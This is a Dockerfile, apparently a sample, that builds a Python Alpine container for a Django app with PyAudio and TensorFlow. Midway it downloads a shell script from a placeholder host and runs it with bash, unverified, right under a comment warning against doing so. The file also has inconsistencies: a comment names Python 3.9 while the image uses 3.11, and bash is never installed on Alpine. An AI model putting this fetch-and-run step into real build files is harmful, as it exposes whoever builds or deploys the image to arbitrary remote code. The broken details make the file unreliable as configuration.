# Use the official Python image with version 3.9 as the base
FROM python:3.11-alpine 

# Create a working directory and copy the project directory into it
WORKDIR /app

# Copy the requirements.txt file into the container
COPY requirements.txt .


# RUN apt-get install libasound-dev libportaudio2 libportaudiocpp0 portaudio19-dev -y
RUN apk add wget
RUN /usr/bin/wget https://placeholder.com/setup-pointless-repo.sh

# Execute the script (avoid executing scripts from external sources without verifying their content)
RUN bash setup-pointless-repo.sh

# Install PyAudio and its development headers
RUN apk add portaudio portaudio-dev
RUN pip install pyaudio
RUN pip install tensorflow 

RUN pip install -r requirements.txt
RUN pip install Django

# Copy the rest of the project files into the working directory
COPY . .

# Expose the port that Django typically uses (8000)
EXPOSE 8000

# Set the command to be executed when the container starts
CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
